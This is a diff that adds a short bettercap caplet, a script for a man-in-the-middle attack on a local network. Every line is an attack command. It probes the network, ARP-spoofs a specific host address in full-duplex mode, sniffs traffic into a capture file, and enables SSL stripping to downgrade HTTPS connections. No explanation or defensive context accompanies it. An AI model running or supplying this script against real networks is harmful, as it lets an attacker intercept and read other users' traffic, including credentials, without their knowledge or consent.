@@ -1,0 +1,8 @@
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.43.171
+arp.spoof on
+set net.sniff.local true
+set net.sniff.output ../output.cap
+set https.proxy.sslstrip true
+net.sniff on
